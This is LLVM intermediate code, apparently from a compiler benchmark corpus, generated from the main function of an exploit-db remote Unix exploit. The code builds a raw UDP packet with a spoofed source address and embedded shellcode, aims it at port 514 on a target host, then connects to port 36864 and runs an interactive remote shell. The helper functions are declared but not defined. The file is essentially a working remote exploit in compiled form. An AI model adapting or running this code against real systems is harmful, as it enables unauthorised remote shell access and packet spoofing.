; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32 }
%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i8, %struct.in_addr, i8*, i32 }
%struct.in_addr = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i8* }
%struct.udphdr = type { i32, i8*, i8* }
%struct.sockaddr = type { i32 }

@D_M = common dso_local global i64 0, align 8
@__const.main.spoof_ip = private unnamed_addr constant [130 x i8] c"216.239.33.101\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@__const.main.host = private unnamed_addr constant [130 x i8] c"localhost\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@plat = common dso_local global %struct.TYPE_2__* null, align 8
@.str = private unnamed_addr constant [23 x i8] c"L:l:H:h:F:f:T:t:IiS:s:\00", align 1
@optarg = external dso_local global i8*, align 8
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c" Try `%s -i' for more information.\0A\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c" [0] Set packet code size.\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c" [1] Set protocol header.\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c" [2] Make shellcode.\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c" gethostbyname()\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [10 x i8] c" socket()\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c" setsockopt()\00", align 1
@.str.9 = private unnamed_addr constant [19 x i8] c" [3] Set rawsock.\0A\00", align 1
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [19 x i8] c" [4] Send packet.\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c" sendto()\00", align 1
@.str.12 = private unnamed_addr constant [20 x i8] c" [5] Trying %s:%d.\0A\00", align 1
@.str.13 = private unnamed_addr constant [26 x i8] c" [*] Connected to %s:%d.\0A\00", align 1
@D_PORT = common dso_local global i32 0, align 4
@FK_IP = common dso_local global i8* null, align 8
@LC_TEST = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 8
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.udphdr*, align 8
  %13 = alloca [130 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [130 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = load i64, i64* @D_M, align 8
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %8, align 4
  %24 = bitcast [130 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %24, i8* align 16 getelementptr inbounds ([130 x i8], [130 x i8]* @__const.main.spoof_ip, i32 0, i32 0), i64 130, i1 false)
  store i32 36864, i32* %14, align 4
  %25 = bitcast [130 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %25, i8* align 16 getelementptr inbounds ([130 x i8], [130 x i8]* @__const.main.host, i32 0, i32 0), i64 130, i1 false)
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %27 = load i32, i32* %8, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i64 %28
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  store i32 %31, i32* %16, align 4
  %32 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %33 = load i32, i32* %8, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i64 %34
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 4
  store i32 %37, i32* %17, align 4
  %38 = call i32 (...) @banrl()
  %39 = load i32, i32* %4, align 4
  %40 = icmp slt i32 %39, 2
  br i1 %40, label %41, label %47

41:                                               ; preds = %2
  %42 = load i8**, i8*** %5, align 8
  %43 = load i64, i64* @D_M, align 8
  %44 = getelementptr inbounds i8*, i8** %42, i64 %43
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @usage(i8* %45)
  br label %47

47:                                               ; preds = %41, %2
  br label %48

48:                                               ; preds = %114, %47
  %49 = load i32, i32* %4, align 4
  %50 = load i8**, i8*** %5, align 8
  %51 = call i32 @getopt(i32 %49, i8** %50, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  store i32 %51, i32* %7, align 4
  %52 = icmp ne i32 %51, -1
  br i1 %52, label %53, label %115

53:                                               ; preds = %48
  %54 = load i32, i32* %7, align 4
  switch i32 %54, label %114 [
    i32 72, label %55
    i32 104, label %55
    i32 70, label %62
    i32 102, label %62
    i32 76, label %69
    i32 108, label %69
    i32 84, label %72
    i32 116, label %72
    i32 83, label %97
    i32 115, label %97
    i32 73, label %100
    i32 105, label %100
    i32 63, label %106
  ]

55:                                               ; preds = %53, %53
  %56 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %57 = load i64, i64* @D_M, align 8
  %58 = call i32 @memset(i8* %56, i64 %57, i32 130)
  %59 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %60 = load i8*, i8** @optarg, align 8
  %61 = call i32 @strncpy(i8* %59, i8* %60, i32 129)
  br label %114

62:                                               ; preds = %53, %53
  %63 = getelementptr inbounds [130 x i8], [130 x i8]* %13, i64 0, i64 0
  %64 = load i64, i64* @D_M, align 8
  %65 = call i32 @memset(i8* %63, i64 %64, i32 130)
  %66 = getelementptr inbounds [130 x i8], [130 x i8]* %13, i64 0, i64 0
  %67 = load i8*, i8** @optarg, align 8
  %68 = call i32 @strncpy(i8* %66, i8* %67, i32 129)
  br label %114

69:                                               ; preds = %53, %53
  %70 = load i8*, i8** @optarg, align 8
  %71 = call i32 @atoi(i8* %70)
  store i32 %71, i32* %17, align 4
  br label %114

72:                                               ; preds = %53, %53
  %73 = load i8*, i8** @optarg, align 8
  %74 = call i32 @atoi(i8* %73)
  store i32 %74, i32* %8, align 4
  %75 = load i32, i32* %8, align 4
  %76 = icmp sgt i32 %75, 4
  br i1 %76, label %77, label %83

77:                                               ; preds = %72
  %78 = load i8**, i8*** %5, align 8
  %79 = load i64, i64* @D_M, align 8
  %80 = getelementptr inbounds i8*, i8** %78, i64 %79
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @usage(i8* %81)
  br label %96

83:                                               ; preds = %72
  %84 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %84, i64 %86
  %88 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %87, i32 0, i32 1
  %89 = load i32, i32* %88, align 4
  store i32 %89, i32* %16, align 4
  %90 = load %struct.TYPE_2__*, %struct.TYPE_2__** @plat, align 8
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %90, i64 %92
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  store i32 %95, i32* %17, align 4
  br label %96

96:                                               ; preds = %83, %77
  br label %114

97:                                               ; preds = %53, %53
  %98 = load i8*, i8** @optarg, align 8
  %99 = call i32 @strtoul(i8* %98, i32* null, i32* null)
  store i32 %99, i32* %16, align 4
  br label %114

100:                                              ; preds = %53, %53
  %101 = load i8**, i8*** %5, align 8
  %102 = load i64, i64* @D_M, align 8
  %103 = getelementptr inbounds i8*, i8** %101, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @usage(i8* %104)
  br label %114

106:                                              ; preds = %53
  %107 = load i32, i32* @stderr, align 4
  %108 = load i8**, i8*** %5, align 8
  %109 = load i64, i64* @D_M, align 8
  %110 = getelementptr inbounds i8*, i8** %108, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 (i32, i8*, ...) @fprintf(i32 %107, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0), i8* %111)
  %113 = call i32 @exit(i32 -1) #4
  unreachable

114:                                              ; preds = %53, %100, %97, %96, %69, %62, %55
  br label %48

115:                                              ; preds = %48
  %116 = load i32, i32* @stdout, align 4
  %117 = call i32 (i32, i8*, ...) @fprintf(i32 %116, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  %118 = load i32, i32* %16, align 4
  %119 = load i32, i32* %17, align 4
  %120 = call i64 @make_sh(i32 %118, i32 %119)
  %121 = inttoptr i64 %120 to i8*
  %122 = call i32 @strlen(i8* %121)
  store i32 %122, i32* %19, align 4
  %123 = load i32, i32* %19, align 4
  %124 = sext i32 %123 to i64
  %125 = add i64 56, %124
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %18, align 4
  %127 = load i32, i32* %18, align 4
  %128 = call i64 @malloc(i32 %127)
  %129 = inttoptr i64 %128 to i8*
  store i8* %129, i8** %20, align 8
  %130 = load i8*, i8** %20, align 8
  %131 = load i64, i64* @D_M, align 8
  %132 = load i32, i32* %18, align 4
  %133 = call i32 @memset(i8* %130, i64 %131, i32 %132)
  %134 = load i8*, i8** %20, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 56
  store i8* %135, i8** %21, align 8
  %136 = load i32, i32* @stdout, align 4
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %136, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %138 = load i8*, i8** %20, align 8
  %139 = bitcast i8* %138 to %struct.iphdr*
  store %struct.iphdr* %139, %struct.iphdr** %11, align 8
  %140 = load i8*, i8** %20, align 8
  %141 = getelementptr inbounds i8, i8* %140, i64 32
  %142 = bitcast i8* %141 to %struct.udphdr*
  store %struct.udphdr* %142, %struct.udphdr** %12, align 8
  %143 = load i32, i32* @stdout, align 4
  %144 = call i32 (i32, i8*, ...) @fprintf(i32 %143, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %145 = load i8*, i8** %21, align 8
  %146 = load i32, i32* %16, align 4
  %147 = load i32, i32* %17, align 4
  %148 = call i64 @make_sh(i32 %146, i32 %147)
  %149 = inttoptr i64 %148 to i8*
  %150 = load i32, i32* %19, align 4
  %151 = call i32 @strncpy(i8* %145, i8* %149, i32 %150)
  %152 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %153 = call %struct.hostent* @gethostbyname(i8* %152)
  store %struct.hostent* %153, %struct.hostent** %9, align 8
  %154 = icmp eq %struct.hostent* %153, null
  br i1 %154, label %155, label %158

155:                                              ; preds = %115
  %156 = call i32 @herror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %157 = call i32 @exit(i32 -1) #4
  unreachable

158:                                              ; preds = %115
  %159 = load i32, i32* @AF_INET, align 4
  %160 = load i32, i32* @SOCK_RAW, align 4
  %161 = load i32, i32* @IPPROTO_RAW, align 4
  %162 = call i32 @socket(i32 %159, i32 %160, i32 %161)
  store i32 %162, i32* %6, align 4
  %163 = icmp eq i32 %162, -1
  br i1 %163, label %164, label %167

164:                                              ; preds = %158
  %165 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %166 = call i32 @exit(i32 -1) #4
  unreachable

167:                                              ; preds = %158
  %168 = load i32, i32* %6, align 4
  %169 = load i32, i32* @IPPROTO_IP, align 4
  %170 = load i32, i32* @IP_HDRINCL, align 4
  %171 = call i32 @setsockopt(i32 %168, i32 %169, i32 %170, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.7, i64 0, i64 0), i32 2)
  %172 = icmp eq i32 %171, -1
  br i1 %172, label %173, label %176

173:                                              ; preds = %167
  %174 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0))
  %175 = call i32 @exit(i32 -1) #4
  unreachable

176:                                              ; preds = %167
  %177 = load i32, i32* @stdout, align 4
  %178 = call i32 (i32, i8*, ...) @fprintf(i32 %177, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %179 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 0
  store i32 4, i32* %180, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 1
  store i32 8, i32* %182, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i8* @htons(i32 %183)
  %185 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 6
  store i8* %184, i8** %186, align 8
  %187 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 2
  store i32 255, i32* %188, align 8
  %189 = load i32, i32* @IPPROTO_UDP, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i32 %189, i32* %191, align 4
  %192 = getelementptr inbounds [130 x i8], [130 x i8]* %13, i64 0, i64 0
  %193 = call i32 @inet_addr(i8* %192)
  %194 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 4
  store i32 %193, i32* %195, align 8
  %196 = load %struct.hostent*, %struct.hostent** %9, align 8
  %197 = getelementptr inbounds %struct.hostent, %struct.hostent* %196, i32 0, i32 0
  %198 = load i64, i64* %197, align 8
  %199 = inttoptr i64 %198 to %struct.in_addr*
  %200 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %199, i32 0, i32 0
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @inet_ntoa(i32 %201)
  %203 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i32 %202, i32* %204, align 4
  %205 = call i8* @htons(i32 130)
  %206 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %207 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %206, i32 0, i32 2
  store i8* %205, i8** %207, align 8
  %208 = call i8* @htons(i32 514)
  %209 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %210 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %209, i32 0, i32 1
  store i8* %208, i8** %210, align 8
  %211 = load i32, i32* %18, align 4
  %212 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %213 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %212, i32 0, i32 0
  store i32 %211, i32* %213, align 8
  %214 = load i32, i32* @AF_INET, align 4
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  store i32 %214, i32* %215, align 8
  %216 = load %struct.udphdr*, %struct.udphdr** %12, align 8
  %217 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %216, i32 0, i32 1
  %218 = load i8*, i8** %217, align 8
  %219 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i8* %218, i8** %219, align 8
  %220 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %221 = load %struct.hostent*, %struct.hostent** %9, align 8
  %222 = getelementptr inbounds %struct.hostent, %struct.hostent* %221, i32 0, i32 0
  %223 = load i64, i64* %222, align 8
  %224 = inttoptr i64 %223 to %struct.in_addr*
  %225 = bitcast %struct.in_addr* %220 to i8*
  %226 = bitcast %struct.in_addr* %224 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %225, i8* align 4 %226, i64 4, i1 false)
  %227 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  %228 = load i64, i64* @D_M, align 8
  %229 = call i32 @memset(i8* %227, i64 %228, i32 8)
  %230 = load i32, i32* @stdout, align 4
  %231 = call i32 (i32, i8*, ...) @fprintf(i32 %230, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %232 = load i32, i32* %6, align 4
  %233 = load i8*, i8** %20, align 8
  %234 = load i32, i32* %18, align 4
  %235 = load i64, i64* @D_M, align 8
  %236 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %237 = call i32 @sendto(i32 %232, i8* %233, i32 %234, i64 %235, %struct.sockaddr* %236, i32 4)
  %238 = icmp eq i32 %237, -1
  br i1 %238, label %239, label %242

239:                                              ; preds = %176
  %240 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  %241 = call i32 @exit(i32 -1) #4
  unreachable

242:                                              ; preds = %176
  %243 = load i32, i32* @stdout, align 4
  %244 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %245 = load i32, i32* %14, align 4
  %246 = call i32 (i32, i8*, ...) @fprintf(i32 %243, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.12, i64 0, i64 0), i8* %244, i32 %245)
  %247 = call i32 @sleep(i32 2)
  %248 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %249 = load i32, i32* %14, align 4
  %250 = call i64 @setsock(i8* %248, i32 %249)
  %251 = trunc i64 %250 to i32
  store i32 %251, i32* %6, align 4
  %252 = load i32, i32* %6, align 4
  %253 = call i32 @re_connt(i32 %252)
  %254 = load i32, i32* @stdout, align 4
  %255 = getelementptr inbounds [130 x i8], [130 x i8]* %15, i64 0, i64 0
  %256 = load i32, i32* %14, align 4
  %257 = call i32 (i32, i8*, ...) @fprintf(i32 %254, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.13, i64 0, i64 0), i8* %255, i32 %256)
  %258 = load i32, i32* %6, align 4
  %259 = call i32 @send_recv_sh(i32 %258)
  %260 = load i32, i32* %3, align 4
  ret i32 %260
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @banrl(...) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @memset(i8*, i64, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strtoul(i8*, i32*, i32*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @make_sh(i32, i32) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @setsockopt(i32, i32, i32, i8*, i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @inet_ntoa(i32) #2

declare dso_local i32 @sendto(i32, i8*, i32, i64, %struct.sockaddr*, i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i64 @setsock(i8*, i32) #2

declare dso_local i32 @re_connt(i32) #2

declare dso_local i32 @send_recv_sh(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
